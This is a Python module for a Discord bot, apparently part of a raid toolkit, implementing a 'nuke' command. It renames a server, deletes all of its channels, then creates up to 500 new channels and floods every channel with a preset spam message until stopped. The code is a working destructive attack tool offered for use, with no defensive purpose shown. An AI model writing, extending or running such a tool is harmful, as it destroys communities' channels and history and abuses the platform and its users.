from Libs import toggles,config,log
from Backbone import discord
import time,asyncio

async def chspam(guild):
  channelcount=len(guild.text_channels)
  while (toggles.nuke and (channelcount < 500)):
    channelcount+=1
    asyncio.create_task((await guild.create_text_channel(toggles.nukechname)).send(toggles.nuketext))
    await asyncio.sleep(0.1)

async def msgspam(guild):
  while toggles.nuke:
    for channel in guild.text_channels:
      asyncio.create_task(channel.send(toggles.nuketext))
      await asyncio.sleep(0.2)
    #await asyncio.sleep(0.3)

def help():
  return "Nuke server"
async def exec(req):
  if toggles.nuketext == None or (req.guild == None and toggles.nukeserverid == None) or toggles.nukechname == None or toggles.nuketitle == None:
    await req.reply("Variables not set. Make sure to set nuketext,nukechname and nuketitle with " + config.prefix + "set. Additionally, set nukeserverid or run this command in a guild." )
    return
  if toggles.nukeserverid == None:
    toggles.nukeserverid = req.guild.id
  await req.delete()
  toggles.nuke = True
  await req.embed("Starting nuke (stop it by using " + config.prefix  +"set nuke false)")
  await req.guild.edit(name=toggles.nuketitle)
  for channel in req.guild.channels:
    try:
      log.logger.debug("Deleting channel")
      asyncio.create_task(channel.delete())
      time.sleep(0.1)
      log.logger.debug("Deleted channel")
    except:
        pass
  await asyncio.gather(chspam(req.guild),msgspam(req.guild))
